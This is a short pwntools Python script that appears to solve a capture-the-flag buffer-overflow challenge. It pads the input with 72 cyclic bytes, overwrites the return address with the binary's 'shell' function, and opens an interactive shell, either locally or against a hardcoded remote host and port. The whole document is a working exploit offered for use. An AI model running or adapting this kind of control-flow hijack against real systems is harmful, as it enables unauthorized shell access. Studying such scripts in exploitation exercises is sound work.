from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('34.123.15.202',5000)
    else:
        return process(e.path)

p = start()


chain = cyclic(72)
chain += p64(e.sym['shell'])

p.sendline(chain)

p.interactive()
